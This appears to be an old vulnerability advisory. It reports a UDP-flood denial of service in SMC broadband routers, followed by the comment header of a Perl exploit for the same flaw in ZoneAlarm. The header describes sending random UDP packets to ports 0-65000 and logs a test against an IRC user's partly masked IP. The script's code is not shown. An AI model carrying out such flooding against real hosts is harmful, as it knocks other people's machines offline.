A denial of service has been reported in the SMC SMC2404WBR BarricadeT Turbo 11/22 Mbps Wireless Cable/DSL Broadband Router. It is possible to trigger this condition by sending UDP packets randomly to ports 0-65000.

The SMC7004VWBR router is also affected by this vulnerability.

# Overview :
#
# ZoneAlarm is a firewall software
# package designed for Microsoft Windows
# operating systems that blocks intrusion
# attempts, trusted by millions, and has
# advanced privacy features like worms,
# Trojan horses, and spyware protection.
# ZoneAlarm is distributed and maintained
# by Zone Labs.http://www.zonelabs.com
#
# Details :
#
# ZoneAlarm was found vulnerable to a
# serious vulnerability leading to a
# remote Denial Of Service condition due
# to failure to handle udp random
# packets, if an attacker sends multiple
# udp packets to multiple ports 0-65000,
# the machine will hang up until the
# attacker stop flooding.
#
# The following is a remote test done
# under ZoneAlarm version 3.7.202 running
# on windows xp home edition.
#
# on irc test1 joined running ZoneAlarm
# version 3.7.202 with default
# installation
#
# * test1 (test@62.251.***.**) has joined #Hackology
#
# from a linux box :
#
# [root@mail DoS]# ping 62.251.***.**

#
# I have made the same test on ZoneAlarm
# Pro 4.0 Release running on windows xp

#
# Exploit released : 02/09/03
#
# Vulnerable Versions : ALL
#
# Operating Systems : ALL Windows
#
# Successfully Tested on :
#
# ZoneAlarm version 3.7.202 / windows xp
# home edition / windows 98.
#
# ZoneAlarm Pro 4.0 Release / windows xp
# professional
#
# Vendor status : UNKOWN
#
# Solution : Shut down ZoneAlarm and wait
# for an update.
#
# The following is a simple code written
# in perl to demonstrate that, the code
# is clean, it wont eat your cpu usage
# and it doesnt need to be run as root
# but you still have to use it at your
# own risk and on your own machine or
# remotly after you get permission.
#
# Big thanx go to D|NOOO and frost for
# providing me windows boxes with
# zonealarm for testing
